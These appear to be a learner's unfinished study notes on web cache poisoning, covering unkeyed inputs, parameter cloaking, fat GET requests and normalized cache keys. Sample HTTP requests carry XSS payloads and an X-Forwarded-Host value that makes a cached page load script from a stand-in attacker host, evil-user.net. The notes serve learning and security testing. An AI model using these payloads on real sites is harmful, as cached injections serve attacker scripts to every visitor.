




Headers to Consider
--------------------
Cache-control directives
Vary header 
3rd parties headers 
analytical headers
CDN cache headers ex :
`akamai-x-get-cache-key` => `Returns the cache key used for the request`


# Exploiting cache implementation flaws 



## Unkeyed port

EX :
-consider the case where a redirect URL was dynamically generated based on the Host header
-This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request.


## Unkeyed query string

how to find : -that you can still get a cache hit even if you change the query parameters.
		             -This indicates that they are not included in the cache key.

EX : 
-Like the Host header, the request line is typically keyed. However, one of the most common cache-key transformations is to exclude the entire query string
```http
GET /?evil='/><script>alert(1)</script>
```



## Unkeyed query parameters

-some websites only exclude specific query parameters that are not relevant to the back-end application
-such as parameters for analytics or serving targeted advertisements. UTM parameters like utm_content
EX:
```http
GET /?utm_content='/><script>alert(1)</script>
```

## Unkeyed Header 


## Unkeyed cookie 


## Cache parameter cloaking


#### -Exploiting parameter parsing quirks


##### check how cache parses the URL to identify and remove the unwanted parameters

- Some poorly written parsing algorithms will treat any ? as the start of a new parameter, regardless of whether it's the first one or not.
```http
GET /?example=123?excluded_param=bad-stuff-here
```


##### check parsing discrepancies between the **cache and the application.**

- The Ruby on Rails framework , interprets both ampersands (&) and semicolons (;) as delimiters.
- When used in conjunction with a cache that does not allow this, you can potentially exploit another quirk to override the value of a keyed parameter in the application logic.


EX: 
- Consider the following request:  
```http
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
- As the names suggest, keyed_param is included in the cache key, but excluded_param is not.

- Many caches will only interpret this as two parameters, delimited by the ampersand:
        keyed_param=abc
        excluded_param=123;keyed_param=bad-stuff-here

- Once the parsing algorithm removes the excluded_param, the cache key will only contain keyed_param=abc.

- On the back-end, however, Ruby on Rails sees the semicolon and splits the query string into three separate parameters:
        keyed_param=abc
        excluded_param=123
        keyed_param=bad-stuff-here
        
-If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final occurrence

-if a website is using JSONP to make a cross-domain request, this will often contain a callback parameter to execute a given function on the returned data:
        GET /jsonp?callback=innocentFunction



#### -Exploiting fat GET support


-the HTTP method may not be keyed.
-This might allow you to poison the cache with a POST request containing a malicious payload in the body.
-Your payload would then even be served in response to users' GET requests.
-Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a GET request to create a "fat" GET request:

EX :
```http
GET /?param=innocent HTTP/1.1
 …
 param=bad-stuff-here
```




#### -Exploiting dynamic content in resource imports


EX : 
- consider a page that reflects the current query string in an import statement:

```
//request
GET /style.css?excluded_param=123);@import… 

//response
HTTP/1.1 HTTP/1.1 200 OK … 
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```
 
- You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import /style.css

- If the page importing the CSS file doesn't specify a `doctype`, you can maybe even exploit static CSS files. Given the right configuration, browsers will simply scour the document looking for CSS and then execute it. This means that you can occasionally poison static CSS files by triggering a server error that reflects the excluded query parameter
```
//request
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} 

//response
HTTP/1.1 HTTP/1.1 200 OK Content-Type: text/html …
This request was blocked due to…alert(1){}*{color:red;}
```


## Normalized cache keys

-Some caching implementations normalize keyed input when adding it to the cache key.
-In this case, both of the following requests would have the same key:

```http
GET /example?param="><test>
```
```http
GET /example?param=%22%3e%3ctest%3e
```

- This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities.
- If you send a malicious request using Burp Repeater, you can poison the cache with an unencoded XSS payload.
- When the victim visits the malicious URL, the payload will still be URL-encoded by their browser; however, once the URL is normalized by the cache, it will have the same cache key as the response containing your unencoded payload.


## Cache key injection

## Internal cache poisoning








# Exploiting cache design flaws 


### Using web cache poisoning to deliver an XSS attack

- Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.
ex:
```http
GET /en?region=uk HTTP/1.1 
Host: innocent-website.com 
X-Forwarded-Host: a."><script>alert(1)</script>" 
```

```http
HTTP/1.1 200 OK 
Cache-Control: public 
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

### Using web cache poisoning to exploit unsafe handling of resource imports

- Some websites use unkeyed headers to dynamically generate URLs for importing resources
ex:
```http
GET / HTTP/1.1 
Host: innocent-website.com 
X-Forwarded-Host: evil-user.net 
User-Agent: Mozilla/5.0 Firefox/57.0 
```

```http
HTTP/1.1 200 OK 
<script src="https://evil-user.net/static/analytics.js"></script>
```

### Using web cache poisoning to exploit cookie-handling vulnerabilities

- Cookies are often used to dynamically generate content in a response , if they are unkeyed it will lead to cache poisoning

### Using multiple headers to exploit web cache poisoning vulnerabilities


### Using web cache poisoning to exploit DOM-based vulnerabilities

- if the website unsafely uses unkeyed headers to import files, this can potentially be exploited by an attacker to import a malicious file instead. However, this applies to more than just JavaScript files.
- Many websites use JavaScript to fetch and process additional data from the back-end.
- If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of DOM-based vulnerabilities.
